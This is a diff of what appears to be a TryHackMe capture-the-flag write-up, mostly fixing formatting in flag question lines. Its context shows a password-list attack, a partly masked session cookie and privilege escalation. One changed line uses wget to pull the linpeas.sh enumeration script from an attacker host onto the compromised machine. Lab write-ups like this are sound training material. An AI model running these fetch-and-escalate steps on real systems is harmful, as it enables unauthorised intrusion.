@@ -310,7 +310,7 @@ Connection: close
 <br>
 <br>
 
-<p> 1.2. What is the first web application flag? Hint : <em>Think about the information you have gathered so far from the web application - usernames, company name, etc. You might want to generate a password list or make educated guesses</em>.<br>
+<p>1.2. What is the first web application flag? Hint : <em>Think about the information you have gathered so far from the web application - usernames, company name, etc. You might want to generate a password list or make educated guesses</em>.<br>
 <code>THM{*******************************}</code></p>
 
 <br>
@@ -418,7 +418,7 @@ crunch: 100% completed generating output
 
 <br>
 <br>
-<p> 1.3. What is the third web application flag?</em>.<br>
+<p>1.3. What is the third web application flag?<br>
 <code>THM{******************************}</code></p>
 <p>
 
@@ -674,7 +674,7 @@ eyJsb2dnZWRfaW4iOn*************************Q.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA
 
 <br>
 <br>
-<p> 1.4. What is the fourth web application flag?</em>.<br>
+<p>1.4. What is the fourth web application flag?<br>
 <code>THM{********************************}</code></p>
 
 <br>
@@ -762,7 +762,6 @@ anders      1402  0.0  0.4 193944  9156 ?        S    18:50   0:00 /usr/sbin/apa
 devops    558122  0.0  0.0   6440   652 pts/6    R+   22:29   0:00 grep --color=auto anders
 ```
 
-
 ```bash
 devops@...:/var/www/html$ ls -lah
 total 12K
@@ -834,13 +833,13 @@ anders@...:/home/anders$ cat user2.txt
 THM{**********************}
 ```
 
-<p> 1.6. What is the user2.txt flag?</em>.<br>
+<p>1.6. What is the user2.txt flag?<br>
 <code>THM{**********************}</code></p>
 
 <br>
 
 ```bash
-anders@...:/$ wget http://xx.xx.xx.xx:8000/linpes.sh
+anders@...:/$ wget http://xx.xx.xx.xx:8000/linpeas.sh
 ```
 
 ```bash
@@ -887,8 +886,8 @@ anders@...:/etc/apache2$ sudo /sbin/service apache2 restart
 <br>
 <br>
 
-<p> 1.7. What is the root.txtflag?</em>.<br>
-<code>THM{______________}</code></p>
+<p>1.7. What is the root.txtflag?<br>
+<code>______________}/code></p>
 
 
 <br>
